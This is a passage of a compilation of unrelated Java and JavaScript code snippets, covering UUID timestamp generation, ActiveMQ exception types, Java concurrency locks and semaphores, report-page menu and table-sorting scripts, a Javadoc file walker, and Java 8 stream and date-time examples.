      String prefix = environment.getProperty("spring.jade4j.prefix", Jade4JAutoConfiguration.DEFAULT_PREFIX);
      String suffix = environment.getProperty("spring.jade4j.suffix", Jade4JAutoConfiguration.DEFAULT_SUFFIX);
      return resourceLoader.getResource(prefix + view + suffix).exists();
    }

    return false;
  }
}
----------------------------------------------------------------------------------------
import java.util.HashMap;
import java.util.Map;

public class TreeNode {
	public Map<String, TreeNode> children = new HashMap<String, TreeNode>();
	
	public TreeNode() { }

	public Map<String, TreeNode> getChildren() {
		return children == null || children.size() == 0? null : children;
	}

	public boolean isLeaf() {  // 说明到了最后一个节点
		return children.size() == 0;
	}
}

import java.util.HashMap;
import java.util.Map;

import org.apache.commons.lang.StringUtils;

public class TreePath {
	public int maxDepth = Integer.MIN_VALUE;
	public Map<String, TreeNode> roots = new HashMap<String, TreeNode>();
	
	public TreePath() { }
	public TreePath(String paths[]) {
		addAll(paths);
	}

	private void add(String paths[], TreeNode parent, int depth) {
		if(paths == null || paths.length <= depth) {
			// 避免深度溢出
			return;
		}
		TreeNode temp = parent.children.get(paths[depth]);
		if(temp == null) { // 找不到入口
			temp = new TreeNode();
			parent.children.put(paths[depth], temp);
			for(int i = depth + 1, l = paths.length; i < l; ++i) {
				TreeNode n = new TreeNode();
				temp.children.put(paths[i], n);
				temp = n;
			}
		}
		else {
			add(paths, temp, depth + 1);
		}
	}
	
	public void add(String path) {
		String paths[] = StringUtils.split(path, '.');
		if(maxDepth < paths.length) { maxDepth = paths.length; }
		Map<String, TreeNode> nodes = this.roots;
		int depth = 0;
		TreeNode temp = nodes.get(paths[depth]);
		if(temp == null) { // 找不到入口
			temp = new TreeNode();
			this.roots.put(paths[depth], temp);
			for(int i = depth + 1, l = paths.length; i < l; ++i) {
				TreeNode n = new TreeNode();
				temp.children.put(paths[i], n);
				temp = n;
			}
		}
		else {
			add(paths, temp, depth + 1);
		}
	}
	
	public void addAll(String paths[]) {
		for(String path : paths) { this.add(path); }
	}
	
	/*public static void main(String[] args) {
		TreePath tp = new TreePath();
		tp.add("n1.n2.n3");
		tp.add("n1.n4");
		System.out.println(JSON.toJSONString(tp));
		System.out.println(NewJsonUtil.toString(tp, new String[]{}));
	}*/
}
----------------------------------------------------------------------------------------
import java.util.Random;

/**
 * UUIDTimer produces the time stamps required for time-based UUIDs. It works as
 * outlined in the UUID specification, with following implementation:
 * <ul>
 * <li>Java classes can only product time stamps with maximum resolution of one
 * millisecond (at least before JDK 1.5). To compensate, an additional counter
 * is used, so that more than one UUID can be generated between java clock
 * updates. Counter may be used to generate up to 10000 UUIDs for each distinct
 * java clock value.
 * <li>Due to even lower clock resolution on some platforms (older Windows
 * versions use 55 msec resolution), timestamp value can also advanced ahead of
 * physical value within limits (by default, up 100 millisecond ahead of
 * reported), iff necessary (ie. 10000 instances created before clock time
 * advances).
 * <li>As an additional precaution, counter is initialized not to 0 but to a
 * random 8-bit number, and each time clock changes, lowest 8-bits of counter
 * are preserved. The purpose it to make likelihood of multi-JVM multi-instance
 * generators to collide, without significantly reducing max. UUID generation
 * speed. Note though that using more than one generator (from separate JVMs) is
 * strongly discouraged, so hopefully this enhancement isn't needed. This 8-bit
 * offset has to be reduced from total max. UUID count to preserve ordering
 * property of UUIDs (ie. one can see which UUID was generated first for given
 * UUID generator); the resulting 9500 UUIDs isn't much different from the
 * optimal choice.
 * <li>Finally, as of version 2.0 and onwards, optional external timestamp
 * synchronization can be done. This is done similar to the way UUID
 * specification suggests; except that since there is no way to lock the whole
 * system, file-based locking is used. This works between multiple JVMs and Jug
 * instances.
 * </ul>
 * <p>
 * Some additional assumptions about calculating the timestamp:
 * <ul>
 * <li>System.currentTimeMillis() is assumed to give time offset in UTC, or at
 * least close enough thing to get correct timestamps. The alternate route would
 * have to go through calendar object, use TimeZone offset to get to UTC, and
 * then modify. Using currentTimeMillis should be much faster to allow rapid
 * UUID creation.
 * <li>Similarly, the constant used for time offset between 1.1.1970 and start
 * of Gregorian calendar is assumed to be correct (which seems to be the case
 * when testing with Java calendars).
 * </ul>
 * <p>
 * Note about synchronization: this class is assumed to always be called from a
 * synchronized context (caller locks on either this object, or a similar timer
 * lock), and so has no method synchronization.
 */
public class UUIDTimer {
   // // // Constants

   /**
    * Since System.longTimeMillis() returns time from january 1st 1970, and
    * UUIDs need time from the beginning of gregorian calendar (15-oct-1582),
    * need to apply the offset:
    */
   private static final long kClockOffset = 0x01b21dd213814000L;

   /**
    * Also, instead of getting time in units of 100nsecs, we get something with
    * max resolution of 1 msec... and need the multiplier as well
    */
   private static final long kClockMultiplier = 10000;

   private static final long kClockMultiplierL = 10000L;

   /**
    * Let's allow "virtual" system time to advance at most 100 milliseconds
    * beyond actual physical system time, before adding delays.
    */
   private static final long kMaxClockAdvance = 100L;

   // // // Configuration

   private final Random mRnd;

   // // // Clock state:

   /**
    * Additional state information used to protect against anomalous cases
    * (clock time going backwards, node id getting mixed up). Third byte is
    * actually used for seeding counter on counter overflow.
    */
   private final byte[] mClockSequence = new byte[3];

   /**
    * Last physical timestamp value <code>System.currentTimeMillis()</code>
    * returned: used to catch (and report) cases where system clock goes
    * backwards. Is also used to limit "drifting", that is, amount timestamps
    * used can differ from the system time value. This value is not guaranteed
    * to be monotonically increasing.
    */
   private long mLastSystemTimestamp = 0L;

   /**
    * Timestamp value last used for generating a UUID (along with
    * {@link #mClockCounter}. Usually the same as {@link #mLastSystemTimestamp},
    * but not always (system clock moved backwards). Note that this value is
    * guaranteed to be monotonically increasing; that is, at given absolute time
    * points t1 and t2 (where t2 is after t1), t1 <= t2 will always hold true.
    */
   private long mLastUsedTimestamp = 0L;

   /**
    * Counter used to compensate inadequate resolution of JDK system timer.
    */
   private int mClockCounter = 0;

   UUIDTimer(final Random rnd) {
      mRnd = rnd;
      initCounters(rnd);
      mLastSystemTimestamp = 0L;
      // This may get overwritten by the synchronizer
      mLastUsedTimestamp = 0L;
   }

   private void initCounters(final Random rnd) {
      /*
       * Let's generate the clock sequence field now; as with counter, this
       * reduces likelihood of collisions (as explained in UUID specs)
       */
      rnd.nextBytes(mClockSequence);
      /*
       * Ok, let's also initialize the counter... Counter is used to make it
       * slightly less likely that two instances of UUIDGenerator (from separate
       * JVMs as no more than one can be created in one JVM) would produce
       * colliding time-based UUIDs. The practice of using multiple generators,
       * is strongly discouraged, of course, but just in case...
       */
      mClockCounter = mClockSequence[2] & 0xFF;
   }

   public void getTimestamp(final byte[] uuidData) {
      // First the clock sequence:
      uuidData[UUID.INDEX_CLOCK_SEQUENCE] = mClockSequence[0];
      uuidData[UUID.INDEX_CLOCK_SEQUENCE + 1] = mClockSequence[1];

      long systime = System.currentTimeMillis();

      /*
       * Let's first verify that the system time is not going backwards;
       * independent of whether we can use it:
       */
      if (systime < mLastSystemTimestamp) {
         // Logger.logWarning("System time going backwards! (got value
         // "+systime+", last "+mLastSystemTimestamp);
         // Let's write it down, still
         mLastSystemTimestamp = systime;
      }

      /*
       * But even without it going backwards, it may be less than the last one
       * used (when generating UUIDs fast with coarse clock resolution; or if
       * clock has gone backwards over reboot etc).
       */
      if (systime <= mLastUsedTimestamp) {
         /*
          * Can we just use the last time stamp (ok if the counter hasn't hit
          * max yet)
          */
         if (mClockCounter < UUIDTimer.kClockMultiplier) { // yup, still have room
            systime = mLastUsedTimestamp;
         } else { // nope, have to roll over to next value and maybe wait
            long actDiff = mLastUsedTimestamp - systime;
            long origTime = systime;
            systime = mLastUsedTimestamp + 1L;

            // Logger.logWarning("Timestamp over-run: need to reinitialize
            // random sequence");

            /*
             * Clock counter is now at exactly the multiplier; no use just
             * anding its value. So, we better get some random numbers
             * instead...
             */
            initCounters(mRnd);

            /*
             * But do we also need to slow down? (to try to keep virtual time
             * close to physical time; ie. either catch up when system clock has
             * been moved backwards, or when coarse clock resolution has forced
             * us to advance virtual timer too far)
             */
            if (actDiff >= UUIDTimer.kMaxClockAdvance) {
               UUIDTimer.slowDown(origTime, actDiff);
            }
         }
      } else {
         /*
          * Clock has advanced normally; just need to make sure counter is reset
          * to a low value (need not be 0; good to leave a small residual to
          * further decrease collisions)
          */
         mClockCounter &= 0xFF;
      }

      mLastUsedTimestamp = systime;

      /*
       * Now, let's translate the timestamp to one UUID needs, 100ns unit offset
       * from the beginning of Gregorian calendar...
       */
      systime *= UUIDTimer.kClockMultiplierL;
      systime += UUIDTimer.kClockOffset;

      // Plus add the clock counter:
      systime += mClockCounter;
      // and then increase
      ++mClockCounter;

      /*
       * Time fields are nicely split across the UUID, so can't just linearly
       * dump the stamp:
       */
      int clockHi = (int) (systime >>> 32);
      int clockLo = (int) systime;

      uuidData[UUID.INDEX_CLOCK_HI] = (byte) (clockHi >>> 24);
      uuidData[UUID.INDEX_CLOCK_HI + 1] = (byte) (clockHi >>> 16);
      uuidData[UUID.INDEX_CLOCK_MID] = (byte) (clockHi >>> 8);
      uuidData[UUID.INDEX_CLOCK_MID + 1] = (byte) clockHi;

      uuidData[UUID.INDEX_CLOCK_LO] = (byte) (clockLo >>> 24);
      uuidData[UUID.INDEX_CLOCK_LO + 1] = (byte) (clockLo >>> 16);
      uuidData[UUID.INDEX_CLOCK_LO + 2] = (byte) (clockLo >>> 8);
      uuidData[UUID.INDEX_CLOCK_LO + 3] = (byte) clockLo;
   }

   /*
    * /////////////////////////////////////////////////////////// // Private
    * methods ///////////////////////////////////////////////////////////
    */

   private static final int MAX_WAIT_COUNT = 50;

   /**
    * Simple utility method to use to wait for couple of milliseconds, to let
    * system clock hopefully advance closer to the virtual timestamps used.
    * Delay is kept to just a millisecond or two, to prevent excessive blocking;
    * but that should be enough to eventually synchronize physical clock with
    * virtual clock values used for UUIDs.
    */
   private static void slowDown(final long startTime, final long actDiff) {
      /*
       * First, let's determine how long we'd like to wait. This is based on how
       * far ahead are we as of now.
       */
      long ratio = actDiff / UUIDTimer.kMaxClockAdvance;
      long delay;

      if (ratio < 2L) { // 200 msecs or less
         delay = 1L;
      } else if (ratio < 10L) { // 1 second or less
         delay = 2L;
      } else if (ratio < 600L) { // 1 minute or less
         delay = 3L;
      } else {
         delay = 5L;
      }
      // Logger.logWarning("Need to wait for "+delay+" milliseconds; virtual
      // clock advanced too far in the future");
      long waitUntil = startTime + delay;
      int counter = 0;
      do {
         try {
            Thread.sleep(delay);
         } catch (InterruptedException ie) {
         }
         delay = 1L;
         /*
          * This is just a sanity check: don't want an "infinite" loop if clock
          * happened to be moved backwards by, say, an hour...
          */
         if (++counter > UUIDTimer.MAX_WAIT_COUNT) {
            break;
         }
      }
      while (System.currentTimeMillis() < waitUntil);
   }
}
----------------------------------------------------------------------------------------
import org.apache.activemq.artemis.utils.uri.BeanSupport;
import org.apache.commons.beanutils.Converter;

public enum CriticalAnalyzerPolicy {
   HALT, SHUTDOWN, LOG;

   static {
      // for URI support on ClusterConnection
      BeanSupport.registerConverter(new CriticalAnalyzerPolicyConverter(), CriticalAnalyzerPolicy.class);
   }

   static class CriticalAnalyzerPolicyConverter implements Converter {

      @Override
      public <T> T convert(Class<T> type, Object value) {
         return type.cast(CriticalAnalyzerPolicy.valueOf(value.toString()));
      }
   }

}
----------------------------------------------------------------------------------------
import javax.net.ssl.SSLPeerUnverifiedException;
import javax.security.cert.X509Certificate;

import io.netty.channel.Channel;
import io.netty.channel.ChannelHandler;
import io.netty.handler.ssl.SslHandler;

public class CertificateUtil {

   public static X509Certificate[] getCertsFromChannel(Channel channel) {
      X509Certificate[] certificates = null;
      ChannelHandler channelHandler = channel.pipeline().get("ssl");
      if (channelHandler != null && channelHandler instanceof SslHandler) {
         SslHandler sslHandler = (SslHandler) channelHandler;
         try {
            certificates = sslHandler.engine().getSession().getPeerCertificateChain();
         } catch (SSLPeerUnverifiedException e) {
            // ignore
         }
      }

      return certificates;
   }
}
----------------------------------------------------------------------------------------
import java.util.Collections;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.Map;

/**
 * Defines all {@link ActiveMQException} types and their codes.
 */
public enum ActiveMQExceptionType {

   // Error codes -------------------------------------------------

   INTERNAL_ERROR(000) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQInternalErrorException(msg);
      }
   },
   UNSUPPORTED_PACKET(001) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQUnsupportedPacketException(msg);
      }
   },
   NOT_CONNECTED(002) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQNotConnectedException(msg);
      }
   },
   CONNECTION_TIMEDOUT(003) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQConnectionTimedOutException(msg);
      }
   },
   DISCONNECTED(004) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQDisconnectedException(msg);
      }
   },
   UNBLOCKED(005) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQUnBlockedException(msg);
      }
   },
   IO_ERROR(006) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQIOErrorException(msg);
      }
   },
   QUEUE_DOES_NOT_EXIST(100) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQNonExistentQueueException(msg);
      }
   },
   QUEUE_EXISTS(101) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQQueueExistsException(msg);
      }
   },
   OBJECT_CLOSED(102) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQObjectClosedException(msg);
      }
   },
   INVALID_FILTER_EXPRESSION(103) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQInvalidFilterExpressionException(msg);
      }
   },
   ILLEGAL_STATE(104) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQIllegalStateException(msg);
      }
   },
   SECURITY_EXCEPTION(105) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQSecurityException(msg);
      }
   },
   ADDRESS_DOES_NOT_EXIST(106) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQAddressDoesNotExistException(msg);
      }
   },
   ADDRESS_EXISTS(107) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQAddressExistsException(msg);
      }
   },
   INCOMPATIBLE_CLIENT_SERVER_VERSIONS(108) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQIncompatibleClientServerException(msg);
      }
   },
   LARGE_MESSAGE_ERROR_BODY(110) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQLargeMessageException(msg);
      }
   },
   TRANSACTION_ROLLED_BACK(111) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQTransactionRolledBackException(msg);
      }
   },
   SESSION_CREATION_REJECTED(112) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQSessionCreationException(msg);
      }
   },
   DUPLICATE_ID_REJECTED(113) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQDuplicateIdException(msg);
      }
   },
   DUPLICATE_METADATA(114) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQDuplicateMetaDataException(msg);
      }
   },
   TRANSACTION_OUTCOME_UNKNOWN(115) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQTransactionOutcomeUnknownException(msg);
      }
   },
   ALREADY_REPLICATING(116) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQAlreadyReplicatingException(msg);
      }
   },
   INTERCEPTOR_REJECTED_PACKET(117) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQInterceptorRejectedPacketException(msg);
      }
   },
   INVALID_TRANSIENT_QUEUE_USE(118) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQInvalidTransientQueueUseException(msg);
      }
   },
   REMOTE_DISCONNECT(119) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQRemoteDisconnectException(msg);
      }
   },
   TRANSACTION_TIMEOUT(120) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQTransactionTimeoutException(msg);
      }
   },
   GENERIC_EXCEPTION(999),
   NATIVE_ERROR_INTERNAL(200),
   NATIVE_ERROR_INVALID_BUFFER(201),
   NATIVE_ERROR_NOT_ALIGNED(202),
   NATIVE_ERROR_CANT_INITIALIZE_AIO(203),
   NATIVE_ERROR_CANT_RELEASE_AIO(204),
   NATIVE_ERROR_CANT_OPEN_CLOSE_FILE(205),
   NATIVE_ERROR_CANT_ALLOCATE_QUEUE(206),
   NATIVE_ERROR_PREALLOCATE_FILE(208),
   NATIVE_ERROR_ALLOCATE_MEMORY(209),
   ADDRESS_FULL(210) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQAddressFullException(msg);
      }
   },
   LARGE_MESSAGE_INTERRUPTED(211) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQLargeMessageInterruptedException(msg);
      }
   },
   CLUSTER_SECURITY_EXCEPTION(212) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQClusterSecurityException(msg);
      }

   },
   NOT_IMPLEMTNED_EXCEPTION(213),
   MAX_CONSUMER_LIMIT_EXCEEDED(214) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQQueueMaxConsumerLimitReached(msg);
      }
   },
   UNEXPECTED_ROUTING_TYPE_FOR_ADDRESS(215) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQUnexpectedRoutingTypeForAddress(msg);
      }
   },
   INVALID_QUEUE_CONFIGURATION(216) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQInvalidQueueConfiguration(msg);
      }
   },
   DELETE_ADDRESS_ERROR(217) {
      @Override
      public ActiveMQException createException(String msg) {
         return new ActiveMQDeleteAddressException(msg);
      }
   };

   private static final Map<Integer, ActiveMQExceptionType> TYPE_MAP;

   static {
      HashMap<Integer, ActiveMQExceptionType> map = new HashMap<>();
      for (ActiveMQExceptionType type : EnumSet.allOf(ActiveMQExceptionType.class)) {
         map.put(type.getCode(), type);
      }
      TYPE_MAP = Collections.unmodifiableMap(map);
   }

   private final int code;

   ActiveMQExceptionType(int code) {
      this.code = code;
   }

   public int getCode() {
      return code;
   }

   public ActiveMQException createException(String msg) {
      return new ActiveMQException(msg + ", code:" + this);
   }

   public static ActiveMQException createException(int code, String msg) {
      return getType(code).createException(msg);
   }

   public static ActiveMQExceptionType getType(int code) {
      ActiveMQExceptionType type = TYPE_MAP.get(code);
      if (type != null)
         return type;
      return ActiveMQExceptionType.GENERIC_EXCEPTION;
   }
}
----------------------------------------------------------------------------------------
ExecutorService executor = Executors.newFixedThreadPool(2);
Map<String, String> map = new HashMap<>();
StampedLock lock = new StampedLock();

executor.submit(() -> {
    long stamp = lock.writeLock();
    try {
        sleep(1);
        map.put("foo", "bar");
    } finally {
        lock.unlockWrite(stamp);
    }
});

Runnable readTask = () -> {
    long stamp = lock.readLock();
    try {
        System.out.println(map.get("foo"));
        sleep(1);
    } finally {
        lock.unlockRead(stamp);
    }
};

executor.submit(readTask);
executor.submit(readTask);

stop(executor);
----------------------------------------------------------------------------------------
ExecutorService executor = Executors.newFixedThreadPool(2);
StampedLock lock = new StampedLock();

executor.submit(() -> {
    long stamp = lock.readLock();
    try {
        if (count == 0) {
            stamp = lock.tryConvertToWriteLock(stamp);
            if (stamp == 0L) {
                System.out.println("Could not convert to write lock");
                stamp = lock.writeLock();
            }
            count = 23;
        }
        System.out.println(count);
    } finally {
        lock.unlock(stamp);
    }
});

stop(executor);


ExecutorService executor = Executors.newFixedThreadPool(10);

Semaphore semaphore = new Semaphore(5);

Runnable longRunningTask = () -> {
    boolean permit = false;
    try {
        permit = semaphore.tryAcquire(1, TimeUnit.SECONDS);
        if (permit) {
            System.out.println("Semaphore acquired");
            sleep(5);
        } else {
            System.out.println("Could not acquire semaphore");
        }
    } catch (InterruptedException e) {
        throw new IllegalStateException(e);
    } finally {
        if (permit) {
            semaphore.release();
        }
    }
}

IntStream.range(0, 10)
    .forEach(i -> executor.submit(longRunningTask));

stop(executor);
----------------------------------------------------------------------------------------
'use strict';

 

var unpack = function (array) {
  var findNbSeries = function (array) {
    var currentPlotPack;

    var length = array.length;

 

    for (var i = 0; i < length; i++) {
      currentPlotPack = array[i][1];

      if(currentPlotPack !== null) {
        return currentPlotPack.length;

      }

    }

    return 0;

  };

 

  var i, j;

  var nbPlots = array.length;

  var nbSeries = findNbSeries(array);

 

  // Prepare unpacked array

  var unpackedArray = new Array(nbSeries);

 

  for (i = 0; i < nbSeries; i++) {
    unpackedArray[i] = new Array(nbPlots);

  }

 

  // Unpack the array

  for (i = 0; i < nbPlots; i++) {
    var timestamp = array[i][0];

    var values = array[i][1];

    for (j = 0; j < nbSeries; j++) {
      unpackedArray[j][i] = [timestamp * 1000, values === null ? null : values[j]];

    }

  }

 

  return unpackedArray;

};

 

 

 

 

 

function getItemLink(item){
                return item.pathFormatted + '.html';

}

 

function setDetailsLinkUrl(){
    $.each(stats.contents, function (name, data) {
        $('#details_link').attr('href', getItemLink(data));

        return false;

    });

}

 

var MENU_ITEM_MAX_LENGTH = 50;

 

function menuItem(item, level, parent, group) {
    if (group)

        var style = 'group';

    else

        var style = '';

 

    if (item.name.length > MENU_ITEM_MAX_LENGTH) {
        var title = ' title="' + item.name + '"';

        var displayName = item.name.substr(0, MENU_ITEM_MAX_LENGTH) + '...';

    }

    else {
        var title = '';

        var displayName = item.name;

    }

 

    if (parent) {
                 if (level == 0)

                                                     var childOfRoot = 'child-of-ROOT ';

                                   else

                                                     var childOfRoot = '';

 

        var style = ' class="' + childOfRoot + 'child-of-menu-' + parent + '"';

    } else

      var style = '';

 

    if (group)

        var expandButton = '<span id="menu-' + item.pathFormatted + '" style="margin-left: ' + (level * 10) + 'px;" class="expand-button">&nbsp;</span>';

    else

        var expandButton = '<span id="menu-' + item.pathFormatted + '" style="margin-left: ' + (level * 10) + 'px;" class="expand-button hidden">&nbsp;</span>';

 

    return '<li' + style + '><div class="item">' + expandButton + '<a href="' + getItemLink(item) + '"' + title + '>' + displayName + '</a></div></li>';

}

 

function menuItemsForGroup(group, level, parent) {
    var items = '';

 

    if (level > 0)

        items += menuItem(group, level - 1, parent, true);

 

    $.each(group.contents, function (contentName, content) {
        if (content.type == 'GROUP')

            items += menuItemsForGroup(content, level + 1, group.pathFormatted);

        else if (content.type == 'REQUEST')

            items += menuItem(content, level, group.pathFormatted);

    });

 

    return items;

}

 

function setDetailsMenu(){
    $('.nav ul').append(menuItemsForGroup(stats, 0));

 

    $('.nav').expandable();

}

 

function setGlobalMenu(){
    $('.nav ul').append('<li><div class="item"><a href="#active_users">Active Users</a></div></li> \

        <li><div class="item"><a href="#requests">Requests / sec</a></div></li> \

        <li><div class="item"><a href="#responses">Responses / sec</a></div></li>');

}

 

function getLink(link){
    var a = link.split('/');

    return (a.length<=1)? link : a[a.length-1];

}

function setActiveMenu(){
    $('.nav a').each(function(){
        if(!$(this).hasClass('expand-button') && $(this).attr('href') == getLink(window.location.pathname)){
            $(this).parents('li').addClass('on');

            return false;

        }

    });

}

 

 

 

 

 

 

 

 

 

 

/*

* Copyright 2011-2014 eBusiness Information, Groupe Excilys (www.ebusinessinformation.fr)

*

* Licensed under the Apache License, Version 2.0 (the "License");

* you may not use this file except in compliance with the License.

* You may obtain a copy of the License at

*

*                            http://www.apache.org/licenses/LICENSE-2.0

*

* Unless required by applicable law or agreed to in writing, software

* distributed under the License is distributed on an "AS IS" BASIS,

* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.

* See the License for the specific language governing permissions and

* limitations under the License.

*/

(function ($) {
                $.fn.expandable = function () {
                               var scope = this;

 

                               this.find('.expand-button:not([class*=hidden])').addClass('collapse').click(function () {
                                               var $this = $(this);

 

                                               if ($this.hasClass('expand'))

                                                               $this.expand(scope);

                                               else

                                                               $this.collapse(scope);

                               });

 

                               this.find('.expand-all-button').click(function () {
                                               $(this).expandAll(scope);

                               });

 

                               this.find('.collapse-all-button').click(function () {
                                               $(this).collapseAll(scope);

                               });

 

                               this.collapseAll(this);

 

                               return this;

                };

 

                $.fn.expand = function (scope, recursive) {
                               return this.each(function () {
                                               var $this = $(this);

 

                                               if (recursive) {
                                                               scope.find('.child-of-' + $this.attr('id') + ' .expand-button.expand').expand(scope, true);

                                                               scope.find('.child-of-' + $this.attr('id') + ' .expand-button.collapse').expand(scope, true);

                                               }

 

                                               if ($this.hasClass('expand')) {
                                                               scope.find('.child-of-' + $this.attr('id')).toggle(true);

                                                               $this.toggleClass('expand').toggleClass('collapse');

                                               }

                               });

                };

 

                $.fn.expandAll = function (scope) {
                               $('.child-of-ROOT .expand-button.expand').expand(scope, true);

                               $('.child-of-ROOT .expand-button.collapse').expand(scope, true);

                };

 

                $.fn.collapse = function (scope) {
                               return this.each(function () {
                                               var $this = $(this);

 

                                  scope.find('.child-of-' + $this.attr('id') + ' .expand-button.collapse').collapse(scope);

                                               scope.find('.child-of-' + $this.attr('id')).toggle(false);

                                               $this.toggleClass('expand').toggleClass('collapse');

                               });

                };

 

                $.fn.collapseAll = function (scope) {
                               $('.child-of-ROOT .expand-button.collapse').collapse(scope);

                };

 

                $.fn.sortable = function (target) {
                               var table = this;

 

                               this.find('thead .sortable').click( function () {
                                               var $this = $(this);

 

                                               if ($this.hasClass('sorted-down')) {
                                                               var desc = false;

                                                               var style = 'sorted-up';

                                               }

                                               else {
                                                               var desc = true;

                                                               var style = 'sorted-down';

                                               }

 

                                               $(target).sortTable($this.attr('id'), desc);

 

                                               table.find('thead .sortable').removeClass('sorted-up sorted-down');

                                               $this.addClass(style);

 

                                               return false;

                               });

 

                               return this;

                };

 

                $.fn.sortTable = function (col, desc) {
                               function getValue(line) {
                                               var cell = $(line).find('.' + col);

 

                                               if (cell.hasClass('value'))

                                                               var value = cell.text();

                                               else

                                                               var value = cell.find('.value').text();

 

                                               return parseInt(value);

                               }

 

                               function sortLines (lines, group) {
            var notErrorTable = col.search("error") == -1;

            var linesToSort = notErrorTable ? lines.filter('.child-of-' + group) : lines;

 

            var sortedLines = linesToSort.sort(function (a, b) {
                                                               return desc ? getValue(b) - getValue(a): getValue(a) - getValue(b);

                                               }).toArray();

 

                                               var result = [];

                                               $.each(sortedLines, function (i, line) {
                                                               result.push(line);

                if (notErrorTable)

                                                                   result = result.concat(sortLines(lines, $(line).attr('id')));

                                               });

 

                                               return result;

                               }

 

                               this.find('tbody').append(sortLines(this.find('tbody tr').detach(), 'ROOT'));

 

                               return this;

                };

})(jQuery);
----------------------------------------------------------------------------------------
/**
 * @author Benjamin Winterberg
 */
public enum MemberType {
    METHOD ("success"),
    CONSTRUCTOR ("info"),
    FIELD ("default"),
    UNKNOWN ("default");

    private String color;

    MemberType(String color) {
        this.color = color;
    }

    public String getColor() {
        return color;
    }
}
/**
 * @author Benjamin Winterberg
 */
public enum FileType {
    CLASS,
    INTERFACE,
    ENUM,
    UNKNOWN;

    public static FileType ofFullType(String fullType) {
        if (fullType.startsWith("Class")) {
            return CLASS;
        }
        if (fullType.startsWith("Interface")) {
            return INTERFACE;
        }
        if (fullType.startsWith("Enum")) {
            return ENUM;
        }
        return UNKNOWN;
    }
}

import org.apache.commons.lang3.StringUtils;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Optional;

/**
 * @author Benjamin Winterberg
 */
public class FileWalker {

    public ExplorerResult walk(String basePath) throws Exception {
        Objects.nonNull(basePath);
        basePath = StringUtils.removeEnd(basePath, "/");

        List<String> paths = getPaths(basePath);

        FileParser parser = new FileParser();

        List<TypeInfo> typeInfos = new ArrayList<>();

        System.out.print("   parsing type infos... ");

        for (int i = 0; i < paths.size(); i++) {
            String path = paths.get(i);
            String sourcePath = basePath + "/" + path;
            File sourceFile = new File(sourcePath);

            Optional<TypeInfo> optional = parser.parse(sourceFile, path);
            optional.ifPresent(typeInfos::add);

//            if (i == 500) {
//                break;
//            }
        }

        System.out.println(typeInfos.size() + " found");

        ExplorerResult result = new ExplorerResult();
        result.setTypeInfos(typeInfos);
        return result;
    }

    private List<String> getPaths(String basePath) throws IOException {
        File file = new File(basePath + "/allclasses-frame.html");
        Document document = Jsoup.parse(file, "UTF-8", "");
        List<String> paths = new ArrayList<>();
        document
                .body()
                .select(".indexContainer li a")
                .forEach((link) -> paths.add(link.attr("href")));
        return paths;
    }

}
----------------------------------------------------------------------------------------
Optional<String> reduced =
    stringCollection
        .stream()
        .sorted()
        .reduce((s1, s2) -> s1 + "#" + s2);

reduced.ifPresent(System.out::println);
// "aaa1#aaa2#bbb1#bbb2#bbb3#ccc#ddd1#ddd2"

Clock clock = Clock.systemDefaultZone();
long millis = clock.millis();

Instant instant = clock.instant();
Date legacyDate = Date.from(instant); 

LocalTime late = LocalTime.of(23, 59, 59);
System.out.println(late);       // 23:59:59

DateTimeFormatter germanFormatter =
    DateTimeFormatter
        .ofLocalizedTime(FormatStyle.SHORT)
        .withLocale(Locale.GERMAN);

LocalTime leetTime = LocalTime.parse("13:37", germanFormatter);
System.out.println(leetTime);   // 13:37

Instant instant = sylvester
        .atZone(ZoneId.systemDefault())
        .toInstant();
		
		
Hint hint = Person.class.getAnnotation(Hint.class);
System.out.println(hint);                   // null

Hints hints1 = Person.class.getAnnotation(Hints.class);
System.out.println(hints1.value().length);  // 2

Hint[] hints2 = Person.class.getAnnotationsByType(Hint.class);
System.out.println(hints2.length);  

import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

/**
 * @author Benjamin Winterberg
 */
public class Executors3 {

    public static void main(String[] args) throws InterruptedException, ExecutionException {
